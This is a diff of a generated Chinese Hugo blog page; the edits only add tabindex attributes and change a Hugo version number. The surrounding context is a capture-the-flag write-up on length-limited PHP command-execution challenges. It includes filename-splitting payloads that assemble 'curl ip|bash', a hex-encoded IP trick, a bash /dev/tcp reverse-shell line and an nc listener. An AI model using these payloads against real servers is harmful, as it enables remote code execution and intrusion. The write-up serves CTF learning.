@@ -111,7 +111,7 @@
 <p>将 <code>.</code> 分隔的每个十进制数转换成两位十六进制再连接起来（可转换成十进制、八进制等），和原 IP 等价使用</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -120,7 +120,7 @@
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">ip</span> <span class="o">=</span> <span class="s1">'172.17.0.1'</span>
+<pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="n">ip</span> <span class="o">=</span> <span class="s1">'172.17.0.1'</span>
 <span class="n">hex_ip</span> <span class="o">=</span> <span class="s1">'0x'</span>
 <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">ip</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'.'</span><span class="p">):</span>
     <span class="n">hex_ip</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">)))[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
@@ -154,7 +154,7 @@
 <p>题目代码如下：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre class="chroma" tabindex="0"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -166,7 +166,7 @@
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<pre class="chroma" tabindex="0"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="nv">$sandbox</span> <span class="o">=</span> <span class="s1">'/tmp/sandbox5/'</span><span class="o">.</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">]);</span>
 <span class="o">@</span><span class="nx">mkdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
 <span class="o">@</span><span class="nx">chdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
@@ -181,7 +181,7 @@
 </div><p>大体思路就是把 <code>curl ip|bash</code> 分割成一个一个小字符串，并在结尾添加 <code>\</code> 连接，将要执行的脚本放在服务器上，这其中还要用到 <code>ls -t</code> ，为了防止 <code>.</code> 的干扰采用十六进制表示 IP (这里需要自己研究怎么分割)</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre class="chroma" tabindex="0"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -204,7 +204,7 @@
 </span><span class="lnt">21
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># ls -t&gt;v</span>
+<pre class="chroma" tabindex="0"><code class="language-bash" data-lang="bash"><span class="c1"># ls -t&gt;v</span>
 &gt;ls<span class="se">\\</span>
 ls&gt;_
 &gt;<span class="se">\ \\</span>
@@ -230,19 +230,19 @@ sh v
 </div><p>服务器中 <code>index.html</code> 中放有反弹 shell 的命令</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">bash -i &gt;<span class="p">&amp;</span> /dev/tcp/172.17.0.1/12345 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+<pre class="chroma" tabindex="0"><code class="language-bash" data-lang="bash">bash -i &gt;<span class="p">&amp;</span> /dev/tcp/172.17.0.1/12345 0&gt;<span class="p">&amp;</span><span class="m">1</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>在服务器监听 <code>12345</code> 端口</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">nc -lvp <span class="m">12345</span>
+<pre class="chroma" tabindex="0"><code class="language-bash" data-lang="bash">nc -lvp <span class="m">12345</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>成功反弹 shell</p>
@@ -251,7 +251,7 @@ sh v
 <p>即上一题的 payload 可简化为</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre class="chroma" tabindex="0"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -271,7 +271,7 @@ sh v
 </span><span class="lnt">18
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># ls -t&gt;v</span>
+<pre class="chroma" tabindex="0"><code class="language-bash" data-lang="bash"><span class="c1"># ls -t&gt;v</span>
 &gt;ls<span class="se">\
 </span><span class="se"></span>ls&gt;_
 &gt;<span class="se">\ \
@@ -297,7 +297,7 @@ sh v
 <p>题目代码如下：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre class="chroma" tabindex="0"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -309,7 +309,7 @@ sh v
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<pre class="chroma" tabindex="0"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="nv">$sandbox</span> <span class="o">=</span> <span class="s1">'/tmp/sandbox4/'</span><span class="o">.</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">]);</span>
 <span class="o">@</span><span class="nx">mkdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
 <span class="o">@</span><span class="nx">chdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
@@ -324,7 +324,7 @@ sh v
 </div><p>思路与之前相同，但是要充分运用 <code>dir</code> 和 <code>rev</code> 命令，先放一下 payload 再进行分析</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre class="chroma" tabindex="0"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -349,7 +349,7 @@ sh v
 </span><span class="lnt">23
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># ls -tk&gt;f</span>
+<pre class="chroma" tabindex="0"><code class="language-bash" data-lang="bash"><span class="c1"># ls -tk&gt;f</span>
 &gt;dir
 &gt;f<span class="se">\&gt;</span>
 &gt;kt-
@@ -424,7 +424,7 @@ sh f
                 Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
             </noscript></div></article></div>
 </main><footer class="footer">
-<div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" rel="noopener noreffer" target="_blank" title="Hugo 0.85.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" rel="noopener noreffer" target="_blank" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+<div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" rel="noopener noreffer" target="_blank" title="Hugo 0.87.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" rel="noopener noreffer" target="_blank" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
 </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder"> <a href="/" target="_blank">X5tar</a></span> | <span class="license"><a href="https://creativecommons.org/licenses/by-sa/4.0/" rel="license external nofollow noopener noreffer" target="_blank">CC BY-SA 4.0</a></span></div>
 </div>
 </footer></div>
